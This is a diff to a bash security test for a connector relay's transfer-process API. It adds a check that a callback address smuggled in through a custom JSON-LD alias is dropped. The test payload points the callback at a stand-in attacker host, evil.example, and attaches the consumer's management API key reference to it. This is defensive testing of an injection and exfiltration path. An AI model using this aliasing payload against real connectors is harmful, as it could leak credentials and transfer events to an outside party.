@@ -80,6 +80,14 @@ TP=$(api "$ADMIN" POST "/reed/connectors/$CONSUMER/v4/transferprocesses" '{"@con
   "https://w3id.org/edc/v0.0.1/ns/authKey": "X-Api-Key", "https://w3id.org/edc/v0.0.1/ns/authCodeId": "'"$CONSUMER"'-mgmt-api-key"}]}' | jq -r '."@id"')
 CBS=$(mgmt "$CONSUMER" GET "/v4/transferprocesses/$TP" | jq -c '[.callbackAddresses[] | .uri]')
 [[ $CBS != *evil* ]] && pass "caller-supplied callback replaced by the server's ($CBS)" || fail "caller callback kept: $CBS"
+# the same through a JSON-LD alias ("cb" -> callbackAddresses): the relay rebuilds requests, it does not filter them
+TP=$(api "$ADMIN" POST "/reed/connectors/$CONSUMER/v4/transferprocesses" '{"@context": ["https://w3id.org/edc/connector/management/v2",
+  {"cb": {"@id": "https://w3id.org/edc/v0.0.1/ns/callbackAddresses", "@container": "@set"}}], "@type": "TransferRequest",
+  "counterPartyAddress": "'"$(dsp_of "$PROVIDER")"'", "protocol": "'$PROTO'", "contractId": "'"$AGR2"'", "transferType": "HttpData-PULL",
+  "cb": [{"@type": "CallbackAddress", "uri": "http://evil.example/alias", "events": ["transfer.process.started"],
+  "https://w3id.org/edc/v0.0.1/ns/authCodeId": "'"$CONSUMER"'-mgmt-api-key"}]}' | jq -r '."@id"')
+CBS=$(mgmt "$CONSUMER" GET "/v4/transferprocesses/$TP" | jq -c '[.callbackAddresses[] | .uri]')
+[[ $CBS != *evil* ]] && pass "aliased callback (custom @context) dropped too ($CBS)" || fail "aliased callback kept: $CBS"
 
 log "done"
 exit $FAILED
